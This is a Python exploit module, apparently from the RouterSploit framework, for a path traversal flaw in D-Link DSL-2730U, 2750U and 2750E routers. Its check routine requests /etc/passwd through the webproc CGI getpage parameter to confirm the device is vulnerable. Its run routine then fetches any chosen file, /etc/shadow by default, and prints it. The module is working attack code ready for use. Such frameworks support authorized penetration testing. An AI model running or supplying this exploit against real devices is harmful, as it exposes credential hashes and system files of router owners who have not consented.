from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "D-Link DSL-2730U/2750U/2750E Path Traversal",
        "description": "Module exploits D-Link DSL-2730U/2750U/2750E Path Traversal "
                       "vulnerability which allows to read any file on the system.",
        "authors": (
            "Todor Donev <todor.donev[at]gmail.com>",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/40735/",
        ),
        "devices": (
            "D-Link DSL-2730U",
            "D-Link DSL-2750U",
            "D-Link DSL-2750E",
        ),
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    filename = OptString("/etc/shadow", "File to read")

    def run(self):
        if self.check():
            path = "/cgi-bin/webproc?getpage={}&errorpage=html/main.html&var:language=en_us" \
                   "&var:menu=setup&var:page=wizard".format(self.filename)

            response = self.http_request(
                method="GET",
                path=path
            )
            if response is None:
                return

            if response.status_code == 200 and len(response.text):
                print_success("Success! File: %s" % self.filename)
                print_info(response.text)
            else:
                print_error("Exploit failed")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        path = "/cgi-bin/webproc?getpage=/etc/passwd&errorpage=html/main.html&var:language=en_us" \
               "&var:menu=setup&var:page=wizard"

        response = self.http_request(
            method="GET",
            path=path
        )
        if response is None:
            return False  # target is not vulnerable

        if utils.detect_file_content(response.text, "/etc/passwd"):
            return True  # target vulnerable

        return False  # target is not vulnerable
